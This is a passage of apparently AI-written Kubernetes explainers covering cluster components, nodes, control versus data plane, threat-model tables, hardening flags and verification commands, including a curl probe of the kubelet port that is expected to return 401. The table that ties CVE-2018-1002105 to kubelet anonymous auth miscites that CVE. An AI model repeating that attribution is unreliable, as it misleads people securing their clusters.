## Summary

The diagram illustrates Kubernetes cluster architecture with a **control plane** (master) managing cluster state and a set of **worker nodes** running application workloads. The control plane exposes the API server as the central coordination point, backed by etcd for state persistence, while schedulers and controllers reconcile desired state. Worker nodes run kubelet (node agent), kube-proxy (network rules), and a container runtime (containerd/CRI-O) to execute pods. All communication flows through the API server; kubectl and cloud-controller-manager interact externally, while internal components use service accounts and TLS mutual auth.

---

## Architecture Breakdown

```
┌─────────────────────────────────────────────────────────────┐
│                      CONTROL PLANE                          │
│  ┌──────────────┐  ┌──────────────┐  ┌─────────────────┐   │
│  │ kube-apiserver│◄─┤     etcd     │  │ kube-scheduler  │   │
│  │  (REST API)   │  │  (key-value  │  │ (pod placement) │   │
│  │  TLS + AuthN/ │  │   store)     │  └────────┬────────┘   │
│  │   AuthZ       │  └──────────────┘           │            │
│  └───────┬───────┘                             │            │
│          │                                     │            │
│  ┌───────▼────────────────────────────────────▼─────────┐   │
│  │   kube-controller-manager                            │   │
│  │   (node/replication/endpoint/service-account ctlrs)  │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │   cloud-controller-manager (optional)                │   │
│  │   (node/route/service/volume controllers for cloud)  │   │
│  └──────────────────────────────────────────────────────┘   │
└──────────────────────────┬──────────────────────────────────┘
                           │ TLS + mTLS
                           │
        ┌──────────────────┼──────────────────┐
        │                  │                  │
┌───────▼──────┐   ┌───────▼──────┐   ┌──────▼───────┐
│   NODE 1     │   │   NODE 2     │   │   NODE N     │
│ ┌──────────┐ │   │ ┌──────────┐ │   │ ┌──────────┐ │
│ │ kubelet  │◄┼───┼─┤ kubelet  │◄┼───┼─┤ kubelet  │ │
│ │(node mgr)│ │   │ │(node mgr)│ │   │ │(node mgr)│ │
│ └────┬─────┘ │   │ └────┬─────┘ │   │ └────┬─────┘ │
│      │       │   │      │       │   │      │       │
│ ┌────▼──────┐│   │ ┌────▼──────┐│   │ ┌────▼──────┐│
│ │Container  ││   │ │Container  ││   │ │Container  ││
│ │Runtime    ││   │ │Runtime    ││   │ │Runtime    ││
│ │(containerd││   │ │(containerd││   │ │(containerd││
│ │/CRI-O)    ││   │ │/CRI-O)    ││   │ │/CRI-O)    ││
│ └───────────┘│   │ └───────────┘│   │ └───────────┘│
│              │   │              │   │              │
│ ┌──────────┐ │   │ ┌──────────┐ │   │ ┌──────────┐ │
│ │kube-proxy│ │   │ │kube-proxy│ │   │ │kube-proxy│ │
│ │(iptables/││   │ │(iptables/││   │ │(iptables/││
│ │ ipvs)    │ │   │ │ ipvs)    │ │   │ │ ipvs)    │ │
│ └──────────┘ │   │ └──────────┘ │   │ └──────────┘ │
│              │   │              │   │              │
│  Pods/Ctnrs  │   │  Pods/Ctnrs  │   │  Pods/Ctnrs  │
└──────────────┘   └──────────────┘   └──────────────┘
```

---

## Component Roles

### Control Plane
- **kube-apiserver**: REST API gateway; all operations go through it (CRUD on cluster objects). Authenticates/authorizes requests (RBAC, webhook, certs). Validates admission webhooks. Persists state to etcd.
- **etcd**: Distributed key-value store (Raft consensus). Holds cluster state (pods, services, configs, secrets). **Single source of truth**. Accessed only by API server.
- **kube-scheduler**: Watches unscheduled pods, assigns them to nodes based on resource requests, affinity/anti-affinity, taints/tolerations, topology constraints.
- **kube-controller-manager**: Runs reconciliation loops (node controller, replication controller, endpoints, service accounts, etc.). Ensures actual state matches desired state.
- **cloud-controller-manager** (optional): Cloud-specific controllers (node lifecycle, routes, load balancers, volumes). Separates cloud provider logic from core K8s.

### Worker Nodes
- **kubelet**: Node agent. Registers node with API server, watches for pod specs assigned to this node, ensures containers are running (via CRI). Reports node/pod status. Mounts volumes, manages secrets/configmaps. Enforces resource limits via cgroups.
- **Container Runtime**: CRI-compliant runtime (containerd, CRI-O). Pulls images, creates/starts/stops containers, manages container lifecycle. Uses runc/crun (OCI runtime) under the hood.
- **kube-proxy**: Network proxy. Maintains iptables/ipvs rules for service load balancing. Routes traffic to correct pod IPs. Implements ClusterIP, NodePort, LoadBalancer semantics.

---

## Data Flow

1. **User → API Server**: `kubectl apply -f pod.yaml` → API server authenticates (client cert/token), authorizes (RBAC), validates schema, runs admission webhooks, writes to etcd.
2. **Scheduler → API Server**: Scheduler watches for unscheduled pods, scores nodes, binds pod to node (updates pod spec in etcd via API server).
3. **Kubelet → API Server**: Kubelet on target node watches for pods assigned to it, pulls image, creates container via CRI, reports status back to API server.
4. **Controller Manager → API Server**: Controllers watch resource changes (e.g., ReplicaSet), reconcile (create/delete pods), update status.
5. **kube-proxy**: Watches services/endpoints, programs iptables/ipvs rules for ClusterIP load balancing.

---

## Security Boundaries & Threat Model

| **Boundary** | **Threat** | **Mitigation** |
|--------------|-----------|----------------|
| **API Server Access** | Unauthenticated/unauthorized API calls | mTLS client certs, OIDC/webhook tokens, RBAC policies, audit logs |
| **etcd Compromise** | Direct etcd access exposes secrets, cluster state | Bind etcd to localhost or private network, mTLS peer/client auth, encrypt secrets at rest (EncryptionConfig), firewall rules |
| **Kubelet API** | Kubelet anonymous auth enabled (CVE-2018-1002105) | `--anonymous-auth=false`, `--authorization-mode=Webhook`, restrict kubelet port (10250) via firewall |
| **Pod Escape** | Container breakout to host | Use AppArmor/SELinux/seccomp profiles, disable privileged pods, RuntimeClass (gVisor/Kata), Pod Security Standards (restricted) |
| **Node Compromise** | Attacker gains root on node | Immutable OS (Flatcar/Bottlerocket), read-only root, TPM-backed attestation, separate node pools, audit syscalls (Falco) |
| **Inter-Pod Traffic** | Lateral movement, eavesdropping | NetworkPolicy (Calico/Cilium), service mesh mTLS (Istio/Linkerd), encrypt pod traffic (WireGuard CNI) |
| **Supply Chain** | Malicious images | Image scanning (Trivy/Clair), admission controller (OPA/Kyverno) enforcing signed images (Sigstore/Notary), private registries |
| **Secrets Exposure** | Secrets in env vars, logs | Use external secrets operator (ESO), HashiCorp Vault, GCP Secret Manager; mount secrets as volumes, rotate regularly |

---

## Key Security Recommendations

1. **API Server**: Always run with `--anonymous-auth=false`, `--authorization-mode=Node,RBAC`, enable audit logging (`--audit-log-path`), use admission webhooks (ValidatingWebhookConfiguration).
2. **etcd**: Run on dedicated nodes or localhost, encrypt at rest (`--encryption-provider-config`), backup frequently, restrict access via firewall.
3. **Kubelet**: `--anonymous-auth=false`, `--authorization-mode=Webhook`, certificate rotation (`--rotate-certificates`), read-only port disabled.
4. **Network**: Deploy CNI with NetworkPolicy support (Calico/Cilium), default-deny policies, use service mesh for mTLS.
5. **RBAC**: Least privilege, no cluster-admin for workloads, use service accounts per pod, avoid wildcard permissions.
6. **Pod Security**: Enforce Pod Security Standards (restricted), no host namespaces (`hostNetwork/hostPID/hostIPC: false`), drop all capabilities, run as non-root.

---

## Testing & Validation

```bash
# 1. Verify control plane components are healthy
kubectl get componentstatuses
kubectl get nodes -o wide

# 2. Check etcd cluster health (if using kubeadm)
sudo ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  --endpoints=https://127.0.0.1:2379 endpoint health

# 3. Test API server RBAC
kubectl auth can-i create pods --as=system:serviceaccount:default:default

# 4. Verify kubelet auth
curl -k https://<node-ip>:10250/pods  # should return 401 Unauthorized

# 5. Test NetworkPolicy enforcement
kubectl run test-nginx --image=nginx
kubectl run test-busybox --image=busybox --rm -it -- wget -O- http://test-nginx
# Apply deny-all NetworkPolicy, verify connection fails

# 6. Audit log analysis
sudo tail -f /var/log/kubernetes/audit.log | jq 'select(.verb=="delete")'

# 7. Benchmark with kube-bench (CIS Kubernetes Benchmark)
docker run --pid=host -v /etc:/etc:ro -v /var:/var:ro \
  aquasec/kube-bench:latest node
```

---

## Failure Modes & Alternatives

| **Component** | **Failure Mode** | **Impact** | **Alternative** |
|--------------|----------------|-----------|----------------|
| **etcd** | Quorum loss, disk corruption | Cluster state unavailable, API server read-only | Run 3/5 node etcd cluster, automated backups (Velero), consider external etcd |
| **API Server** | OOM, crash | No new operations, existing pods run | Run multiple API server replicas behind load balancer |
| **Scheduler** | Down | New pods remain unscheduled, existing pods unaffected | Deploy multiple schedulers (HA), custom scheduler for critical workloads |
| **Kubelet** | Crash, OOM | Pods on node may stop, node marked NotReady | Use liveness probes, kubelet auto-restart (systemd), node auto-replacement (cluster-autoscaler) |
| **kube-proxy** | iptables corruption | Service traffic fails, pod-to-pod direct traffic works | Use ipvs mode (`--proxy-mode=ipvs`), deploy Cilium (eBPF, no kube-proxy) |
| **CNI Plugin** | Misconfiguration | Pods lose network, can't schedule new pods | Deploy CNI with HA (Calico with BGP peering), test in staging, rollback via DaemonSet version |

---

## Next 3 Steps

1. **Deploy a minimal cluster** with kubeadm (1 control plane, 2 workers), enable audit logging, encrypt etcd secrets at rest, verify mTLS between components.
   ```bash
   kubeadm init --pod-network-cidr=10.244.0.0/16 --apiserver-audit-log-path=/var/log/k8s-audit.log
   kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml
   ```

2. **Harden the cluster**: Apply CIS Benchmark recommendations (kube-bench), set up RBAC policies (no default service account with cluster-admin), deploy Pod Security Standards admission controller.
   ```bash
   kubectl label --overwrite ns default pod-security.kubernetes.io/enforce=restricted
   ```

3. **Simulate failure scenarios**: Stop etcd on one node (verify quorum maintained), kill API server pod (verify second replica serves), inject network partition (test controller reconciliation), deploy Chaos Mesh for continuous testing.

---

## References

- **Kubernetes Components**: https://kubernetes.io/docs/concepts/overview/components/
- **Securing a Cluster**: https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/
- **CIS Kubernetes Benchmark**: https://www.cisecurity.org/benchmark/kubernetes
- **kube-bench**: https://github.com/aquasecurity/kube-bench
- **Pod Security Standards**: https://kubernetes.io/docs/concepts/security/pod-security-standards/
- **etcd Security Model**: https://etcd.io/docs/latest/op-guide/security/

## Summary

A **node** is a physical or virtual machine (VM) that runs workloads in a Kubernetes cluster. It's the compute resource (bare-metal server, EC2 instance, GCE VM, etc.) where your containers actually execute. Nodes are **not** provided by Kubernetes—you must provision them separately (via cloud providers, on-prem hardware, or local VMs). Kubernetes components (kubelet, kube-proxy, container runtime) are software you install on these machines. The control plane manages nodes, but nodes themselves are infrastructure you bring. Think of Kubernetes as the orchestration layer that coordinates pre-existing compute resources.

---

## What is a Node?

A **node** is:
- A **worker machine** (physical server, VM, cloud instance) registered with the Kubernetes cluster
- Runs the **kubelet** agent, **container runtime** (containerd/CRI-O), and **kube-proxy**
- Executes **pods** (groups of containers) scheduled by the control plane
- Reports health, capacity (CPU/memory/disk), and pod status to the API server

```
Node (Physical/Virtual Machine)
├── Operating System (Linux: Ubuntu, RHEL, Flatcar, Bottlerocket)
├── kubelet (K8s agent - binary you install)
├── Container Runtime (containerd/CRI-O - you install)
├── kube-proxy (network rules - K8s component)
├── CNI Plugin (Calico/Cilium - you install)
└── Running Pods
    ├── Pod 1: nginx container
    ├── Pod 2: redis container
    └── Pod 3: app + sidecar containers
```

### Node Examples
| **Environment** | **Node Type** | **How Provisioned** |
|----------------|--------------|---------------------|
| **AWS** | EC2 instance (t3.large) | Launched via EKS node group, Kops, or manually with `aws ec2 run-instances` |
| **GCP** | GCE VM (n1-standard-4) | GKE node pool, or `gcloud compute instances create` |
| **Azure** | VM (Standard_D4s_v3) | AKS node pool, or `az vm create` |
| **On-prem** | Dell R740 server | Bare-metal with PXE boot, Ansible provisioning |
| **Local dev** | VirtualBox VM, Docker Desktop | Minikube, kind (Kubernetes in Docker) |

---

## What Kubernetes Provides vs. What You Provide

```
┌─────────────────────────────────────────────────────────────┐
│          WHAT YOU MUST PROVIDE (Infrastructure)             │
├─────────────────────────────────────────────────────────────┤
│ • Physical servers / VMs / cloud instances (NODES)          │
│ • Operating System (Linux distro)                           │
│ • Network connectivity (VPC, subnets, routing)              │
│ • Storage (local disks, SAN, cloud block storage)           │
│ • Container runtime (containerd, CRI-O) - install yourself  │
│ • CNI plugin (Calico, Cilium, Flannel) - install yourself   │
└─────────────────────────────────────────────────────────────┘
                            ▲
                            │ You provision
                            │
┌───────────────────────────┴─────────────────────────────────┐
│       WHAT KUBERNETES PROVIDES (Orchestration Software)     │
├─────────────────────────────────────────────────────────────┤
│ Control Plane Components (you install as binaries/pods):    │
│   • kube-apiserver                                          │
│   • etcd                                                    │
│   • kube-scheduler                                          │
│   • kube-controller-manager                                 │
│   • cloud-controller-manager (optional)                     │
│                                                             │
│ Node Components (you install as binaries/systemd services): │
│   • kubelet                                                 │
│   • kube-proxy                                              │
│                                                             │
│ Client Tools:                                               │
│   • kubectl (CLI)                                           │
│                                                             │
│ API Abstractions (built-in resources):                      │
│   • Pods, Deployments, Services, ConfigMaps, Secrets, etc.  │
└─────────────────────────────────────────────────────────────┘
```

### Key Point: Kubernetes is **Software**, Not Infrastructure
- Kubernetes does **not** create VMs or physical machines for you
- Kubernetes does **not** include a container runtime (you install containerd/CRI-O)
- Kubernetes does **not** include a CNI plugin (you choose Calico/Cilium/Flannel)
- Kubernetes **assumes** you have:
  - Machines with Linux OS
  - Network connectivity between nodes
  - A container runtime installed
  - Storage available (local or networked)

---

## How Nodes Join a Cluster

### Manual Setup (Hard Way)
1. **Provision a VM/server** (AWS EC2, bare-metal, etc.)
2. **Install container runtime**:
   ```bash
   # Install containerd
   wget https://github.com/containerd/containerd/releases/download/v1.7.11/containerd-1.7.11-linux-amd64.tar.gz
   sudo tar Czxvf /usr/local containerd-1.7.11-linux-amd64.tar.gz
   sudo systemctl enable --now containerd
   ```
3. **Install kubelet, kubeadm, kubectl**:
   ```bash
   sudo apt-get update
   sudo apt-get install -y kubelet kubeadm kubectl
   sudo systemctl enable kubelet
   ```
4. **Join the cluster**:
   ```bash
   # On control plane, get join command
   kubeadm token create --print-join-command
   
   # On worker node, run the join command
   sudo kubeadm join <control-plane-ip>:6443 --token <token> --discovery-token-ca-cert-hash sha256:<hash>
   ```
5. **Verify node is registered**:
   ```bash
   kubectl get nodes
   # NAME       STATUS   ROLES    AGE   VERSION
   # worker-1   Ready    <none>   5m    v1.28.0
   ```

### Managed Kubernetes (Easier)
Cloud providers abstract node provisioning:

```bash
# EKS (AWS) - creates EC2 instances as nodes
eksctl create nodegroup --cluster=my-cluster --name=ng-1 --node-type=t3.medium --nodes=3

# GKE (GCP) - creates GCE VMs as nodes
gcloud container node-pools create pool-1 --cluster=my-cluster --machine-type=n1-standard-2 --num-nodes=3

# AKS (Azure) - creates Azure VMs as nodes
az aks nodepool add --resource-group myRG --cluster-name myCluster --name pool1 --node-count 3 --node-vm-size Standard_D2s_v3
```

**What happens under the hood:**
1. Cloud provider creates VMs (nodes) with pre-installed kubelet, container runtime, CNI
2. Kubelet on each node registers with the API server
3. Node appears in `kubectl get nodes`

---

## Node Lifecycle & Components

```
┌─────────────────────────────────────────────────────────────┐
│  NODE (EC2 Instance: 172.31.10.5, 4 vCPU, 16GB RAM)         │
├─────────────────────────────────────────────────────────────┤
│  OS: Ubuntu 22.04, Kernel: 5.15                             │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  kubelet (systemd service)                           │   │
│  │  • Registers node with API server                    │   │
│  │  • Watches for pods assigned to this node            │   │
│  │  • Calls CRI to create containers                    │   │
│  │  • Reports node/pod status (heartbeat every 10s)     │   │
│  │  • Mounts volumes, injects secrets/configmaps        │   │
│  └──────────────────────────────────────────────────────┘   │
│                          │                                  │
│                          ▼ CRI (gRPC)                       │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  containerd (container runtime)                      │   │
│  │  • Pulls images from registry                        │   │
│  │  • Creates/starts/stops containers via runc          │   │
│  │  • Manages container lifecycle                       │   │
│  └──────────────────────────────────────────────────────┘   │
│                          │                                  │
│                          ▼ OCI Runtime                      │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  runc (low-level runtime)                            │   │
│  │  • Creates cgroups for resource limits               │   │
│  │  • Sets up namespaces (PID, NET, MNT, IPC, UTS)      │   │
│  │  • Applies seccomp/AppArmor/SELinux profiles         │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  kube-proxy (DaemonSet pod or systemd service)       │   │
│  │  • Programs iptables/ipvs rules for Services         │   │
│  │  • Load balances traffic to pod IPs                  │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  CNI Plugin (Calico, Cilium)                         │   │
│  │  • Assigns pod IP addresses (from CIDR)              │   │
│  │  • Configures pod network interfaces                 │   │
│  │  • Enforces NetworkPolicies                          │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                             │
│  Running Pods:                                              │
│    ├── kube-system/coredns-xyz (DNS)                        │
│    ├── default/nginx-abc (user workload)                    │
│    └── monitoring/prometheus-def (metrics)                  │
└─────────────────────────────────────────────────────────────┘
```

---

## What's Built-in vs. What You Install

| **Component** | **Built-in?** | **Who Provides It?** |
|--------------|--------------|---------------------|
| **Node (VM/server)** | ❌ No | You (AWS, bare-metal, etc.) |
| **Operating System** | ❌ No | You (Ubuntu, RHEL, Flatcar) |
| **kubelet** | ✅ Yes (software) | Kubernetes project (you install binary) |
| **kube-apiserver** | ✅ Yes (software) | Kubernetes project (runs on control plane nodes) |
| **etcd** | ✅ Yes (software) | CoreOS/CNCF (you install or use embedded) |
| **kube-scheduler** | ✅ Yes (software) | Kubernetes project |
| **kube-controller-manager** | ✅ Yes (software) | Kubernetes project |
| **kube-proxy** | ✅ Yes (software) | Kubernetes project (DaemonSet) |
| **Container Runtime** | ❌ No | You choose: containerd, CRI-O |
| **CNI Plugin** | ❌ No | You choose: Calico, Cilium, Flannel, Weave |
| **CSI Plugin (storage)** | ❌ No | Cloud provider or 3rd party (AWS EBS CSI, Rook/Ceph) |
| **Ingress Controller** | ❌ No | You choose: NGINX, Traefik, Istio Gateway |
| **kubectl** | ✅ Yes (CLI tool) | Kubernetes project (you install on your laptop) |

### Installation Options
1. **From scratch (Kelsey Hightower's "Kubernetes The Hard Way")**:
   - Manually download binaries, configure systemd units, generate certs
   - Full control, deep learning, production-grade
   
2. **kubeadm (semi-automated)**:
   ```bash
   # On control plane node
   sudo kubeadm init --pod-network-cidr=10.244.0.0/16
   
   # On worker nodes
   sudo kubeadm join <control-plane-ip>:6443 --token <token> --discovery-token-ca-cert-hash <hash>
   ```

3. **Managed Kubernetes (fully automated)**:
   - EKS, GKE, AKS handle control plane + node provisioning
   - You just specify node count, instance type

4. **Local dev (kind, minikube)**:
   ```bash
   # kind creates Docker containers as "nodes"
   kind create cluster --config cluster.yaml
   ```

---

## Node Capacity & Resources

Nodes report their capacity to the API server:

```bash
kubectl describe node worker-1
```

Output:
```yaml
Capacity:
  cpu:                4       # 4 vCPUs
  ephemeral-storage:  100Gi   # Local disk
  memory:             16Gi    # RAM
  pods:               110     # Max pods per node (configurable)

Allocatable:  # After reserving for kubelet, OS
  cpu:                3800m   # 3.8 vCPUs available for pods
  memory:             14.5Gi
  pods:               110

Allocated resources:
  (requests)  (limits)
  cpu:        1500m    3000m   # Current pod requests/limits
  memory:     4Gi      8Gi
```

**Scheduler uses this to place pods**:
- Pod requests 500m CPU, 1Gi memory
- Scheduler finds node with `Allocatable - Allocated >= requested`
- Kubelet enforces limits via cgroups

---

## Security Considerations for Nodes

| **Attack Surface** | **Threat** | **Mitigation** |
|-------------------|-----------|----------------|
| **SSH Access** | Attacker gains shell on node, escalates to containers | Disable SSH, use ephemeral nodes (auto-scaling), bastion host with 2FA, audit logs (auditd) |
| **kubelet API (10250)** | Unauthenticated API calls, exec into pods | `--anonymous-auth=false`, `--authorization-mode=Webhook`, firewall rules (only control plane → kubelet) |
| **Node-to-etcd** | Compromised node reads secrets from etcd | Run etcd on separate machines, bind to localhost, mTLS, no direct node access |
| **Container Escape** | Privileged container, kernel exploit | Disable privileged pods (PodSecurityPolicy/Standards), use gVisor/Kata, AppArmor/SELinux |
| **Node OS CVEs** | Unpatched kernel, systemd | Immutable OS (Flatcar, Bottlerocket), auto-update (kured for node reboots), vulnerability scanning |
| **Metadata Service** | Pod accesses cloud metadata (AWS IMDS) | Block 169.254.169.254 via NetworkPolicy, use IMDSv2 (session tokens), Workload Identity (GKE) |

---

## Testing Node Setup

```bash
# 1. Verify node is registered and Ready
kubectl get nodes -o wide

# 2. Check kubelet is running and healthy
sudo systemctl status kubelet
sudo journalctl -u kubelet -f  # Live logs

# 3. Test container runtime
sudo ctr --namespace k8s.io containers list  # containerd
sudo crictl ps  # CRI debugging tool

# 4. Verify kubelet can pull images
kubectl run test-pod --image=nginx --restart=Never
kubectl get pod test-pod -o wide  # Should show node assignment

# 5. Check kubelet API auth (should fail)
curl -k https://<node-ip>:10250/pods
# Expected: 401 Unauthorized (good!)

# 6. Test pod scheduling on specific node
kubectl run test-node --image=busybox --overrides='{"spec":{"nodeName":"worker-1"}}' --command -- sleep 3600
kubectl get pod test-node -o wide

# 7. Stress test node resources
kubectl run stress --image=polinux/stress --command -- stress --cpu 2 --timeout 60s
kubectl top node worker-1  # Watch CPU spike

# 8. Simulate node failure
# On control plane, mark node as unschedulable
kubectl cordon worker-1
kubectl drain worker-1 --ignore-daemonsets --delete-emptydir-data
# Pods reschedule to other nodes

# 9. Check node conditions
kubectl describe node worker-1 | grep -A 10 Conditions
# Look for: Ready, MemoryPressure, DiskPressure, PIDPressure

# 10. Validate CNI plugin
kubectl run net-test --image=nicolaka/netshoot --command -- sleep 3600
kubectl exec net-test -- ip addr  # Should have pod IP from CNI
kubectl exec net-test -- ping 8.8.8.8  # Test external connectivity
```

---

## Next 3 Steps

1. **Provision a 3-node cluster** (1 control plane, 2 workers) using kubeadm on AWS EC2 or local VMs (Vagrant/VirtualBox). Install containerd, configure kubelet with `--anonymous-auth=false`, deploy Calico CNI.
   ```bash
   # Control plane
   sudo kubeadm init --pod-network-cidr=192.168.0.0/16
   kubectl apply -f https://docs.projectcalico.org/manifests/calico.yaml
   
   # Worker nodes
   sudo kubeadm join <control-plane-ip>:6443 --token <token> --discovery-token-ca-cert-hash <hash>
   ```

2. **Inspect node internals**: SSH into a worker node, examine kubelet config (`/var/lib/kubelet/config.yaml`), check cgroups (`systemd-cgls`), list running containers (`crictl ps`), trace syscalls of a container (`sudo strace -p <pid>`).

3. **Simulate node failure scenarios**: Cordoned node (no new pods scheduled), drained node (all pods evicted), killed kubelet (pods continue running but status unreported), network partition (node marked NotReady after 40s), OOM on node (evict pods based on QoS class).

---

## References

- **Kubernetes Nodes**: https://kubernetes.io/docs/concepts/architecture/nodes/
- **Kubernetes The Hard Way**: https://github.com/kelseyhightower/kubernetes-the-hard-way
- **kubelet Configuration**: https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/
- **Container Runtimes**: https://kubernetes.io/docs/setup/production-environment/container-runtimes/
- **Node Autoscaler**: https://github.com/kubernetes/autoscaler/tree/master/cluster-autoscaler

## Summary

**Control plane** manages cluster state and makes scheduling/orchestration decisions (kube-apiserver, etcd, scheduler, controllers). **Data plane** executes workloads and handles actual traffic (worker nodes, kubelet, kube-proxy, pods, container runtime). Control plane runs on dedicated nodes (can be same or separate from workers) and communicates with data plane via API server over mTLS. **Sidecars** are auxiliary containers running alongside main application containers in the same pod, sharing network/storage namespaces—used for logging, proxying, secrets injection, or observability without modifying app code. Control plane nodes can be compromised to own entire cluster; data plane compromise affects only that node's workloads. Defense-in-depth requires hardening both planes separately.

---

## Control Plane vs Data Plane

```
┌────────────────────────────────────────────────────────────────┐
│                     CONTROL PLANE                              │
│  (Brains: decides WHAT should happen, WHERE it runs)           │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  ┌──────────────┐  ┌──────────────┐  ┌────────────────────┐   │
│  │kube-apiserver│◄─┤     etcd     │  │  kube-scheduler    │   │
│  │              │  │              │  │  (pod placement)   │   │
│  │ REST API     │  │ Cluster State│  └─────────┬──────────┘   │
│  │ AuthN/AuthZ  │  │ (Raft)       │            │              │
│  │ Validation   │  │              │            │              │
│  └──────┬───────┘  └──────────────┘            │              │
│         │                                      │              │
│         │         ┌────────────────────────────▼─────────┐    │
│         │         │  kube-controller-manager            │    │
│         │         │  (reconciliation loops)             │    │
│         │         │  • Deployment controller            │    │
│         │         │  • ReplicaSet controller            │    │
│         │         │  • Node controller                  │    │
│         │         │  • Service account controller       │    │
│         │         └─────────────────────────────────────┘    │
│         │                                                    │
│         │         ┌────────────────────────────────────────┐ │
│         │         │  cloud-controller-manager (optional)   │ │
│         │         │  • Node lifecycle (cloud VMs)          │ │
│         │         │  • LoadBalancer provisioning           │ │
│         │         │  • Route management                    │ │
│         │         └────────────────────────────────────────┘ │
└─────────┼────────────────────────────────────────────────────┘
          │
          │ TLS + mTLS (typically port 6443)
          │ API calls: watch, create, update, delete
          │
┌─────────▼────────────────────────────────────────────────────┐
│                      DATA PLANE                              │
│  (Hands: executes WHAT was decided, runs actual workloads)   │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │   NODE 1     │    │   NODE 2     │    │   NODE N     │  │
│  │              │    │              │    │              │  │
│  │ ┌──────────┐ │    │ ┌──────────┐ │    │ ┌──────────┐ │  │
│  │ │ kubelet  │ │    │ │ kubelet  │ │    │ │ kubelet  │ │  │
│  │ │(watches  │◄┼────┼─┤(watches  │◄┼────┼─┤(watches  │ │  │
│  │ │API srvr) │ │    │ │API srvr) │ │    │ │API srvr) │ │  │
│  │ └────┬─────┘ │    │ └────┬─────┘ │    │ └────┬─────┘ │  │
│  │      │       │    │      │       │    │      │       │  │
│  │ ┌────▼──────┐│    │ ┌────▼──────┐│    │ ┌────▼──────┐│  │
│  │ │Container  ││    │ │Container  ││    │ │Container  ││  │
│  │ │Runtime    ││    │ │Runtime    ││    │ │Runtime    ││  │
│  │ │(containerd││    │ │(containerd││    │ │(containerd││  │
│  │ └───────────┘│    │ └───────────┘│    │ └───────────┘│  │
│  │              │    │              │    │              │  │
│  │ ┌──────────┐ │    │ ┌──────────┐ │    │ ┌──────────┐ │  │
│  │ │kube-proxy│ │    │ │kube-proxy│ │    │ │kube-proxy│ │  │
│  │ │(iptables/││    │ │(iptables/││    │ │(iptables/││  │
│  │ │ipvs rules││    │ │ipvs rules││    │ │ipvs rules││  │
│  │ └──────────┘ │    │ └──────────┘ │    │ └──────────┘ │  │
│  │              │    │              │    │              │  │
│  │ PODS:        │    │ PODS:        │    │ PODS:        │  │
│  │ • nginx      │    │ • redis      │    │ • postgres   │  │
│  │ • app-v1     │    │ • app-v2     │    │ • monitoring │  │
│  │ • sidecar    │    │ • sidecar    │    │ • sidecar    │  │
│  └──────────────┘    └──────────────┘    └──────────────┘  │
│                                                             │
│  User Traffic Flows Through Data Plane:                     │
│  User → Ingress/LB → kube-proxy → Pods (app containers)    │
└──────────────────────────────────────────────────────────────┘
```

---

## Control Plane Deep Dive

### Purpose
- **Cluster management**: Desired state vs actual state reconciliation
- **Scheduling**: Decides which node runs which pod
- **Configuration**: Stores all cluster objects (ConfigMaps, Secrets, Deployments)
- **Service discovery**: Maintains endpoint lists for Services
- **Admission control**: Validates/mutates API requests before persistence

### Components & Responsibilities

| **Component** | **Role** | **Failure Impact** |
|--------------|---------|-------------------|
| **kube-apiserver** | Central API gateway; all CRUD operations | Cluster unavailable; existing pods continue running |
| **etcd** | Distributed key-value store; single source of truth | No state changes; read-only mode if quorum lost |
| **kube-scheduler** | Assigns pods to nodes based on constraints | New pods remain unscheduled |
| **kube-controller-manager** | Runs reconciliation loops (replicas, endpoints, etc.) | No auto-healing; manual intervention required |
| **cloud-controller-manager** | Cloud-specific operations (load balancers, volumes) | Cloud resources not provisioned/updated |

### Where Control Plane Runs

**Option 1: Dedicated Control Plane Nodes (Production)**
```
┌─────────────────────────────────────────────┐
│  CONTROL PLANE NODES (tainted, no workloads)│
│  ┌──────────────┐  ┌──────────────┐         │
│  │  master-1    │  │  master-2    │         │
│  │  (x86_64)    │  │  (x86_64)    │         │
│  │              │  │              │         │
│  │ api-server   │  │ api-server   │         │
│  │ etcd         │  │ etcd         │         │
│  │ scheduler    │  │ scheduler    │         │
│  │ controller   │  │ controller   │         │
│  └──────────────┘  └──────────────┘         │
└─────────────────────────────────────────────┘
             │
             ▼ API calls (6443/TCP)
┌─────────────────────────────────────────────┐
│  WORKER NODES (untainted, run workloads)    │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │ worker-1 │  │ worker-2 │  │ worker-3 │  │
│  │ kubelet  │  │ kubelet  │  │ kubelet  │  │
│  │ pods     │  │ pods     │  │ pods     │  │
│  └──────────┘  └──────────┘  └──────────┘  │
└─────────────────────────────────────────────┘
```

**Verification**:
```bash
# Check node roles
kubectl get nodes
# NAME       STATUS   ROLES           AGE   VERSION
# master-1   Ready    control-plane   10d   v1.28.0
# master-2   Ready    control-plane   10d   v1.28.0
# worker-1   Ready    <none>          10d   v1.28.0
# worker-2   Ready    <none>          10d   v1.28.0

# Control plane nodes are tainted (no user workloads)
kubectl describe node master-1 | grep Taints
# Taints: node-role.kubernetes.io/control-plane:NoSchedule

# Verify control plane pods
kubectl get pods -n kube-system -o wide | grep master-1
# etcd-master-1                      1/1     Running   master-1
# kube-apiserver-master-1            1/1     Running   master-1
# kube-controller-manager-master-1   1/1     Running   master-1
# kube-scheduler-master-1            1/1     Running   master-1
```

**Option 2: Stacked Control Plane (kubeadm default)**
```
┌────────────────────────────────────────┐
│  CONTROL PLANE NODE (master-1)        │
│  ┌──────────────────────────────────┐ │
│  │  etcd (pod)                      │ │
│  │  kube-apiserver (pod)            │ │
│  │  kube-scheduler (pod)            │ │
